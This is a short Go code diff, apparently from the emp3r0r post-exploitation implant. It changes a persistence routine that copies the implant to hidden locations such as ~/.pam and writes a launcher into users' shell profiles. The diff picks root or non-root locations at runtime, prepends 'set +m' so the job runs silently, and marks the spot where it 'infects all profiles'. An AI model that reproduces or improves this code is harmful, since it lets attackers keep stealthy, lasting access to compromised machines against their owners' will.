@@ -55,9 +55,6 @@ var (
 		fmt.Sprintf("%s/.pam",
 			os.Getenv("HOME")),
 	}
-
-	// call this to start emp3r0r
-	payload = strings.Join(EmpLocationsNoRoot, " || ")
 )
 
 // SelfCopy copy emp3r0r to multiple locations
@@ -118,6 +115,13 @@ func profiles() (err error) {
 	// source
 	sourceCmd := "source ~/.bashprofile"
 
+	// call this to start emp3r0r
+	locations := EmpLocations
+	if !HasRoot() {
+		locations = EmpLocationsNoRoot
+	}
+	payload := strings.Join(locations, " || ")
+
 	// set +m to silent job control
 	payload = "set +m;" + payload
 
@@ -167,7 +171,7 @@ func profiles() (err error) {
 		return
 	}
 	if strings.Contains(string(data), sourceCmd) {
-		err = errors.New("profiles: already written")
+		err = errors.New("already written")
 		return
 	}
 	// infect all profiles
